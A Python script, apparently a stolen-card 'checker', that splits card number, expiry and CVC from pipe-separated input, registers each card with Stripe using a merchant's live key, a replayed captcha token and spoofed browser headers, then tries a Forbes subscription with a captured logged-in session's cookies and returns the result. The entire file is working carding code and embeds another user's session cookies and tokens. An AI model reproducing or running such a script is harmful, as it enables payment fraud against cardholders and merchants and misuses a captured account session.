import requests
import requests
import time
import user_agent
from user_agent import generate_user_agent
user_agent = generate_user_agent()
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	
	
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=90001&billing_details[address][country]=US&payment_user_agent=stripe.js%2F1bf62714f1%3B+stripe-js-v3%2F1bf62714f1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Faccount.forbes.com&time_on_page=75140&client_attribution_metadata[client_session_id]=8d9e9f6f-162d-450a-bd36-acf6c263bf45&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=91fbb521-dec9-4c76-8a30-db763fc485d44a83b0&muid=5e9434b0-2459-488d-a392-58e478da9143de0a2f&sid=baa238e4-9f1a-4dc2-89b5-5de2370e53377abc85&key=pk_live_51MPVwKELupcuapjmm85plx8ePt9H7TO1VanYr9lSbBl19AryB818R9Fbwp9eUkBQfF2BiZJTssKJLWgiX2IXApDo005mkM8wtI&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZCrs5L0c3ghB1sOE5nUkSStu0lcOTpb2aJFaCjoIJMB08ji7sSPo4k1kTbuBhToPCR9QxRvR9N51T4RNiqftgESEt4axJGKgeHLJd6oT6-9PbrRy2ZrVlYinF3-Y0oXKjAdTLOeg71Gc2RaaiF-H64xslrE9tVVklmhzbuaCr-NPEfeRO9ab5wusZ3r3U1RVq5oy0t7oE5mSQVgvJ23-AU0A9mYi1qv4SiE3fclb30HstE2rAGYjblYSgknInStynxyL7zbxGgFBRk-FPsmJrJIzzlpCdAeaT3BFuJBaDhavE-K12XEmmgYAj7FYtvMlAF5fd8KHI7N7Ju8ywwEVT6MZfY2n-7aj9rdU_rRkrSWrhEeke3NmtqLEcKxgjd-1Vym1zsdEXqnuLN_9-6T8IapoIGCHa56746cHT3nZ4i-A7RPElWuL9DYV1eX1Cb3K_PpkchIzSiN_Tcmt-zEShDsBQGayZmwRfu6xvSWmXadEkA6FvCqg0g9K2Giauxnv4fGeWXosK0BTh_k5mmzk_tdwhgxjiIdOj6E8eiw3nO4m1OLiMO4iuLxQKM45Q95mJB7vC9BOd9kBUvYJ79-ZmNgIcG-lVxSF6d4DBs67oVnySwymLGH_Nq4h1T96GJca-gXyuKdeG-diIZr08zt9EyhqLGtDuz-o6ZcFJbPExE2F4F5mVuZdvMgYMfxrx3pCldMwCha_5FqFc-PWRIp7XsMz-kCe-8TwxRjBF8SoVnZZF_UQjZacTjStVDyQekYDa4fhZ91rg4AoJUwCAvjYpskOo4_yl7Wk8WGeJv9500dmiKKVJqCq2zArd95N7ixhak9rGgXGevMEK9bjQbS6G-Ym4AgQaEzX_MCqLdUh9ZCF0WCi-uN3Vz0zRjp94yAxuJKGVsD_edHXIxMeSHNxs5suI_IhUvnhiNynLx_rLaY3NNXWILVsBi9DMTx20uMOmg7F2qiVTbwSZFg9db_RpvkAP0x9gdUDrTuvgvlRU1BM_jIbuQvZ2YDZBz8lThGqxvIQWwEaWD6-KUawf5G4wTIJepTrmbDp3l4HSFJwxqPOlirzqjNTp5CVa8CTgBXivAZswFDKVUFj1gVUGaUz1I1L0nbYt1ZwqRp0b94cu8QiJLhiW8L2ePlZ27IycQ1yL7eZJk37dkAX7zqcKB6H7ctkkGI4SNsgCnatHZepx9wBHJsQdtgVjUA3DuuKCCTvb7g6G5WuT77oosBAXbqH-XbgoUeYdSJflQfZtxXXTQtRk9Nnw3fjDnk72bKhdJBDxTV-0_RO2YaMg0gIuN__XSONx9Pm1A2gOmi0fFdRGMDoEdsrFdn5Z7cHCfUe-M-HrKo0ScgmDP3ULXn7ucVgp3y8TB7JNDGxmlvMa9iUjlyhE1Ro5nbtzh7Rxwp-pXI3gbkKwu8XHGlRlsL06M-bY2UjB8GRVFgP4ImPiQRhIelnQpQbE33GGjmozCubkmCkB6DrVpnXWIv9R0UeezyBhM91qfpRiRE9k6btOgY7YfaYK57OztwBx4Ep5HKMSkPD_-tIUg11vYScJ0cLL5gzyU1UmLFbLezCKwMMmh6Py6o2ENVZnX9jZouQb12JcNm0-GhZVCjNVIuivUXBlovM6YYhr7mmkMSCesSWjTcJSj3mjDQKnH-SQ0vnYLa1JpRofpe7GwoP-RrUeixdCqDqyNvV5aQLCdKU1oC_DKoSHjQ_4tezNMWjpyBNsowU_xxnUznLMubqSk6Ry6C9O5d7snLbupSNCiDqMo8FlPWnovGwwLfNHQgeAWFPBW_booyyeqAekAeCCfXLEkwci5Osla--FvDhYlc5FjK3zwDq5MG-IibXzYgNYpRM_j1u7ec_sDMQZReJj0sxoyTr5dpU2v-Gbkve2EMS_b9PcVjUtoTWOSkiI-Azs0T4xtKCz5ngFq-HNxx2Khe4xkTeb8n3_VvwdcD6ZTx9xYbom0_vmXa8wyQrku_ENHnEkGy_J7-Tjd6atTZha__2uIno0c6TCwnFgRiBl-kaUd-07CCGkjVNQ4uq3W8rkHPwp7JpchswRv3SZ-G59CZux3PNf8ZwpBO6uj2pFQvttkOZyPiMqaofYfOM2OenR9BmSNse2shyGoHtjZJogsogwIyi_I0MUB7WNno2V4cM5mYg1NqHNoYXJkX2lkzgMxg2-ia3KoMmM4ZjE1YmOicGQA.XfdLEeGijTFsEnbekR8IRSDtoPAz9tv6T5jt_7-EGhc'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	cookies = {
	    'client_id': 'f954032cba39960f86ca8f51a7498b491ae',
	    '_lc2_fpi': '1f8b889072fc--01hy3tecb6dveeh5me2egts8m4',
	    '_lc2_fpi_meta': '{%22w%22:1715967832423}',
	    '_fbp': 'fb.1.1715967835845.283979332',
	    '_ga': 'GA1.3.1270647678.1715967830',
	    'BCSessionID': '3afe3e88-0987-4de1-9f7e-a63bc3f9b188',
	    'usprivacy': '1---',
	    'us_privacy': '1---',
	    '_swb': '8f19bb15-931d-4743-a01a-559894da1439',
	    '_ketch_consent_v1_': 'eyJiZWhhdmlvcmFsX2FkdmVydGlzaW5nIjp7InN0YXR1cyI6ImdyYW50ZWQiLCJjYW5vbmljYWxQdXJwb3NlcyI6WyJiZWhhdmlvcmFsX2FkdmVydGlzaW5nIl19LCJhbmFseXRpY3MiOnsic3RhdHVzIjoiZ3JhbnRlZCIsImNhbm9uaWNhbFB1cnBvc2VzIjpbImFuYWx5dGljcyJdfSwiZnVuY3Rpb25hbCI6eyJzdGF0dXMiOiJncmFudGVkIiwiY2Fub25pY2FsUHVycG9zZXMiOlsicHJvZF9lbmhhbmNlbWVudCIsInBlcnNvbmFsaXphdGlvbiJdfSwicmVxdWlyZWQiOnsic3RhdHVzIjoiZ3JhbnRlZCIsImNhbm9uaWNhbFB1cnBvc2VzIjpbImVzc2VudGlhbF9zZXJ2aWNlcyJdfX0%3D',
	    '__qca': 'P0-1367292256-1715967831663',
	    'ki_r': '',
	    '_cb': '093IYCxWs_IB6HruY',
	    '_gcl_au': '1.1.1893911146.1715967830.1259784072.1715968635.1715968635',
	    'blaize_session': 'c1e1d781-150c-4d79-bbf5-46babc43dca1',
	    'blaize_prev_anon_session': '7da01b61-e287-442d-8b5c-8ee7c2cd458f',
	    'blaize_tracking_id': 'de99f070-347b-469a-8376-c9c29d899ef1',
	    'fbs-zephr-access': 'logged-in',
	    '_hp2_id.657665248': '%7B%22userId%22%3A%228459053206599510%22%2C%22pageviewId%22%3A%227344291983589970%22%2C%22sessionId%22%3A%227277292336699249%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
	    '__stripe_mid': '5e9434b0-2459-488d-a392-58e478da9143de0a2f',
	    '__gads': 'ID=06abd3efbdc6e8a4:T=1715967831:RT=1717701759:S=ALNI_MbyrWAdCcoF0xITkW1aQ-jL6M3lfw',
	    '__gpi': 'UID=00000d76530d45c1:T=1715967831:RT=1717701759:S=ALNI_MZ_0gA3mKfGpmSA_fB5K54o0_qDXw',
	    '__eoi': 'ID=7a9cc69a510d2b39:T=1715967831:RT=1717701759:S=AA-AfjbAqRt6EiY92UsuQg8NiSXF',
	    'rbzid': 'mrVANKmJfFuYAgbaG7r+L/DUPVUyuAd+WqDtDH4rNOsMqxRf97hqElabhLkQKsn/RaUN7WrUtSkJ3chR1YAUviVX4ImwKU7nRUSCzBdFS4T6w3ybDXRAepEQaQebwAMGKBYWTbA4q8jYT6OCbXWZ+Bj8jdC4IFgKgInW7ddX9GhhiarBMh8M4y/mS2/nWR/7V/8HzgShDtbCYL2SljrwqxEl5vPeoq+OihVY6NtpJNM=',
	    'rbzsessionid': '2b5caa411b267ff38088c9da657a0631',
	    'AMP_TOKEN': '%24NOT_FOUND',
	    '_gid': 'GA1.2.735599146.1717701764',
	    '_li_dcdm_c': '.forbes.com',
	    '_sp_ses.986d': '*',
	    '_sp_id.986d': 'a21448def7a34217.1717701765.1.1717701765.1717701765.2d8be018-cae3-4500-859d-07331487eb5e',
	    'cto_bundle': 'abcwA19YclNJTmVnWGl5d0lyd0M4WSUyQkh4VGRwU1JEVmxrYkR0ZVRPWEpYVTVuZHl5bCUyQjNYQURzZ0pGTzhEVlI1d1pnbDg3NlhIOXFOUWpNZlpQOVB1QWV1NUQ0RXBRYzdGdWJvR1J6UUZHZVJWY2txOXM5d1gyQ2FiWG1zcXg5R0w4VlBJRWhjM3QyV3hrQXhjZWFMU0FHMnV3JTNEJTNE',
	    'cto_bidid': 'Ud7DEV8lMkZOS1oxQkp3c1NjRUhaOE16T3h2SmRnUFpQc1VzOVdtZ1l3b1k5RGY4bVFCa29uQ1U0ZCUyQkx4RzVwVUM4YmhyTHRyeEF5cHFBek1TOXBndjhjNG1uVEhZWTNiRHU1QkZtUjVaSlQ2cHNybFklM0Q',
	    '_gid': 'GA1.3.735599146.1717701764',
	    '_ga': 'GA1.1.1270647678.1715967830',
	    '_li_ss': 'CmoKBQgKEIwYCgYIpAEQjBgKBgjdARCMGAoFCAYQjBgKBgilARCMGAoFCAkQjBgKBgjhARCMGAoGCIEBEIwYCgUIDBCWGAoGCKIBEIwYCgUICxCMGAoGCIsBEIwYCgYI0gEQjBgKBQh-EIwY',
	    '_li_ss_meta': '{%22w%22:1717701800992%2C%22e%22:1720293800991}',
	    '_swb_consent_': 'eyJlbnZpcm9ubWVudENvZGUiOiJwcm9kdWN0aW9uIiwiaWRlbnRpdGllcyI6eyJfZ29vZ2xlQW5hbHl0aWNzQ2xpZW50SUQiOiJHQTEuMS4xMjcwNjQ3Njc4LjE3MTU5Njc4MzAiLCJzd2Jfd2Vic2l0ZV9zbWFydF90YWciOiI4ZjE5YmIxNS05MzFkLTQ3NDMtYTAxYS01NTk4OTRkYTE0MzkifSwianVyaXNkaWN0aW9uQ29kZSI6ImRlZmF1bHQiLCJwcm9wZXJ0eUNvZGUiOiJ3ZWJzaXRlX3NtYXJ0X3RhZyIsInB1cnBvc2VzIjp7ImFuYWx5dGljcyI6eyJhbGxvd2VkIjoidHJ1ZSIsImxlZ2FsQmFzaXNDb2RlIjoibGVnaXRpbWF0ZWludGVyZXN0In0sImJlaGF2aW9yYWxfYWR2ZXJ0aXNpbmciOnsiYWxsb3dlZCI6InRydWUiLCJsZWdhbEJhc2lzQ29kZSI6ImxlZ2l0aW1hdGVpbnRlcmVzdCJ9LCJmdW5jdGlvbmFsIjp7ImFsbG93ZWQiOiJ0cnVlIiwibGVnYWxCYXNpc0NvZGUiOiJsZWdpdGltYXRlaW50ZXJlc3QifSwicmVxdWlyZWQiOnsiYWxsb3dlZCI6InRydWUiLCJsZWdhbEJhc2lzQ29kZSI6ImxlZ2l0aW1hdGVpbnRlcmVzdCJ9fSwiY29sbGVjdGVkQXQiOjE3MTc3MDE4MDN9',
	    'ki_t': '1715967872504%3B1717701803167%3B1717701803167%3B2%3B3',
	    '_chartbeat2': '.1715967873773.1717701804062.0000000000000001.GrATmDM4hxZOzSWMBpaKQGmjQbD.1',
	    '_cb_svref': 'external',
	    'QSI_HistorySession': 'https%3A%2F%2Faccount.forbes.com%2Fmembership%3FeventSource%3Dheader%26redirect%3Dhttps%3A%2F%2Fwww.forbes.com%2F~1717701805041',
	    '__stripe_sid': 'baa238e4-9f1a-4dc2-89b5-5de2370e53377abc85',
	    '_dc_gtm_UA-5883199-3': '1',
	    '_ga_DLD85VJ5QY': 'GS1.1.1717701760.2.1.1717701903.60.0.0',
	    'AWSALB': 'pFGHtlxfO3a5a+H+AfgI3MLBFjbGr4jH3Z+7cs1YDWmPC/bkSbPxIymNXYm6xaJ7LkwfycW/EbaS7kV/admDUx9KvNun0wxXjZE7v23FwaSDfD12QbnwfkxbfPkS',
	    'AWSALBCORS': 'pFGHtlxfO3a5a+H+AfgI3MLBFjbGr4jH3Z+7cs1YDWmPC/bkSbPxIymNXYm6xaJ7LkwfycW/EbaS7kV/admDUx9KvNun0wxXjZE7v23FwaSDfD12QbnwfkxbfPkS',
	}
	
	headers = {
	    'authority': 'account.forbes.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    # 'cookie': 'client_id=f954032cba39960f86ca8f51a7498b491ae; _lc2_fpi=1f8b889072fc--01hy3tecb6dveeh5me2egts8m4; _lc2_fpi_meta={%22w%22:1715967832423}; _fbp=fb.1.1715967835845.283979332; _ga=GA1.3.1270647678.1715967830; BCSessionID=3afe3e88-0987-4de1-9f7e-a63bc3f9b188; usprivacy=1---; us_privacy=1---; _swb=8f19bb15-931d-4743-a01a-559894da1439; _ketch_consent_v1_=eyJiZWhhdmlvcmFsX2FkdmVydGlzaW5nIjp7InN0YXR1cyI6ImdyYW50ZWQiLCJjYW5vbmljYWxQdXJwb3NlcyI6WyJiZWhhdmlvcmFsX2FkdmVydGlzaW5nIl19LCJhbmFseXRpY3MiOnsic3RhdHVzIjoiZ3JhbnRlZCIsImNhbm9uaWNhbFB1cnBvc2VzIjpbImFuYWx5dGljcyJdfSwiZnVuY3Rpb25hbCI6eyJzdGF0dXMiOiJncmFudGVkIiwiY2Fub25pY2FsUHVycG9zZXMiOlsicHJvZF9lbmhhbmNlbWVudCIsInBlcnNvbmFsaXphdGlvbiJdfSwicmVxdWlyZWQiOnsic3RhdHVzIjoiZ3JhbnRlZCIsImNhbm9uaWNhbFB1cnBvc2VzIjpbImVzc2VudGlhbF9zZXJ2aWNlcyJdfX0%3D; __qca=P0-1367292256-1715967831663; ki_r=; _cb=093IYCxWs_IB6HruY; _gcl_au=1.1.1893911146.1715967830.1259784072.1715968635.1715968635; blaize_session=c1e1d781-150c-4d79-bbf5-46babc43dca1; blaize_prev_anon_session=7da01b61-e287-442d-8b5c-8ee7c2cd458f; blaize_tracking_id=de99f070-347b-469a-8376-c9c29d899ef1; fbs-zephr-access=logged-in; _hp2_id.657665248=%7B%22userId%22%3A%228459053206599510%22%2C%22pageviewId%22%3A%227344291983589970%22%2C%22sessionId%22%3A%227277292336699249%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; __stripe_mid=5e9434b0-2459-488d-a392-58e478da9143de0a2f; __gads=ID=06abd3efbdc6e8a4:T=1715967831:RT=1717701759:S=ALNI_MbyrWAdCcoF0xITkW1aQ-jL6M3lfw; __gpi=UID=00000d76530d45c1:T=1715967831:RT=1717701759:S=ALNI_MZ_0gA3mKfGpmSA_fB5K54o0_qDXw; __eoi=ID=7a9cc69a510d2b39:T=1715967831:RT=1717701759:S=AA-AfjbAqRt6EiY92UsuQg8NiSXF; rbzid=mrVANKmJfFuYAgbaG7r+L/DUPVUyuAd+WqDtDH4rNOsMqxRf97hqElabhLkQKsn/RaUN7WrUtSkJ3chR1YAUviVX4ImwKU7nRUSCzBdFS4T6w3ybDXRAepEQaQebwAMGKBYWTbA4q8jYT6OCbXWZ+Bj8jdC4IFgKgInW7ddX9GhhiarBMh8M4y/mS2/nWR/7V/8HzgShDtbCYL2SljrwqxEl5vPeoq+OihVY6NtpJNM=; rbzsessionid=2b5caa411b267ff38088c9da657a0631; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.735599146.1717701764; _li_dcdm_c=.forbes.com; _sp_ses.986d=*; _sp_id.986d=a21448def7a34217.1717701765.1.1717701765.1717701765.2d8be018-cae3-4500-859d-07331487eb5e; cto_bundle=abcwA19YclNJTmVnWGl5d0lyd0M4WSUyQkh4VGRwU1JEVmxrYkR0ZVRPWEpYVTVuZHl5bCUyQjNYQURzZ0pGTzhEVlI1d1pnbDg3NlhIOXFOUWpNZlpQOVB1QWV1NUQ0RXBRYzdGdWJvR1J6UUZHZVJWY2txOXM5d1gyQ2FiWG1zcXg5R0w4VlBJRWhjM3QyV3hrQXhjZWFMU0FHMnV3JTNEJTNE; cto_bidid=Ud7DEV8lMkZOS1oxQkp3c1NjRUhaOE16T3h2SmRnUFpQc1VzOVdtZ1l3b1k5RGY4bVFCa29uQ1U0ZCUyQkx4RzVwVUM4YmhyTHRyeEF5cHFBek1TOXBndjhjNG1uVEhZWTNiRHU1QkZtUjVaSlQ2cHNybFklM0Q; _gid=GA1.3.735599146.1717701764; _ga=GA1.1.1270647678.1715967830; _li_ss=CmoKBQgKEIwYCgYIpAEQjBgKBgjdARCMGAoFCAYQjBgKBgilARCMGAoFCAkQjBgKBgjhARCMGAoGCIEBEIwYCgUIDBCWGAoGCKIBEIwYCgUICxCMGAoGCIsBEIwYCgYI0gEQjBgKBQh-EIwY; _li_ss_meta={%22w%22:1717701800992%2C%22e%22:1720293800991}; _swb_consent_=eyJlbnZpcm9ubWVudENvZGUiOiJwcm9kdWN0aW9uIiwiaWRlbnRpdGllcyI6eyJfZ29vZ2xlQW5hbHl0aWNzQ2xpZW50SUQiOiJHQTEuMS4xMjcwNjQ3Njc4LjE3MTU5Njc4MzAiLCJzd2Jfd2Vic2l0ZV9zbWFydF90YWciOiI4ZjE5YmIxNS05MzFkLTQ3NDMtYTAxYS01NTk4OTRkYTE0MzkifSwianVyaXNkaWN0aW9uQ29kZSI6ImRlZmF1bHQiLCJwcm9wZXJ0eUNvZGUiOiJ3ZWJzaXRlX3NtYXJ0X3RhZyIsInB1cnBvc2VzIjp7ImFuYWx5dGljcyI6eyJhbGxvd2VkIjoidHJ1ZSIsImxlZ2FsQmFzaXNDb2RlIjoibGVnaXRpbWF0ZWludGVyZXN0In0sImJlaGF2aW9yYWxfYWR2ZXJ0aXNpbmciOnsiYWxsb3dlZCI6InRydWUiLCJsZWdhbEJhc2lzQ29kZSI6ImxlZ2l0aW1hdGVpbnRlcmVzdCJ9LCJmdW5jdGlvbmFsIjp7ImFsbG93ZWQiOiJ0cnVlIiwibGVnYWxCYXNpc0NvZGUiOiJsZWdpdGltYXRlaW50ZXJlc3QifSwicmVxdWlyZWQiOnsiYWxsb3dlZCI6InRydWUiLCJsZWdhbEJhc2lzQ29kZSI6ImxlZ2l0aW1hdGVpbnRlcmVzdCJ9fSwiY29sbGVjdGVkQXQiOjE3MTc3MDE4MDN9; ki_t=1715967872504%3B1717701803167%3B1717701803167%3B2%3B3; _chartbeat2=.1715967873773.1717701804062.0000000000000001.GrATmDM4hxZOzSWMBpaKQGmjQbD.1; _cb_svref=external; QSI_HistorySession=https%3A%2F%2Faccount.forbes.com%2Fmembership%3FeventSource%3Dheader%26redirect%3Dhttps%3A%2F%2Fwww.forbes.com%2F~1717701805041; __stripe_sid=baa238e4-9f1a-4dc2-89b5-5de2370e53377abc85; _dc_gtm_UA-5883199-3=1; _ga_DLD85VJ5QY=GS1.1.1717701760.2.1.1717701903.60.0.0; AWSALB=pFGHtlxfO3a5a+H+AfgI3MLBFjbGr4jH3Z+7cs1YDWmPC/bkSbPxIymNXYm6xaJ7LkwfycW/EbaS7kV/admDUx9KvNun0wxXjZE7v23FwaSDfD12QbnwfkxbfPkS; AWSALBCORS=pFGHtlxfO3a5a+H+AfgI3MLBFjbGr4jH3Z+7cs1YDWmPC/bkSbPxIymNXYm6xaJ7LkwfycW/EbaS7kV/admDUx9KvNun0wxXjZE7v23FwaSDfD12QbnwfkxbfPkS',
	    'origin': 'https://account.forbes.com',
	    'referer': 'https://account.forbes.com/membership?eventSource=header&redirect=https://www.forbes.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'product_id': 'RKPEVDB',
	    'plan_id': 'price_1OrSKXELupcuapjme9sKJcqy',
	    'vendor_fields': {
	        'payment_method': id,
	        'billing_address_provided': False,
	    },
	}
	
	response = requests.post('https://account.forbes.com/zephr/subscribe', cookies=cookies, headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"product_id":"RKPEVDB","plan_id":"price_1OrSKXELupcuapjme9sKJcqy","vendor_fields":{"payment_method":"pm_1POlvoELupcuapjmeTrBNYTS","billing_address_provided":false}}'
	#response = requests.post('https://account.forbes.com/zephr/subscribe', cookies=cookies, headers=headers, data=data)
	time.sleep(9)
	try:
		ii=(response.text)
	except:
		return 'success'
	return ii
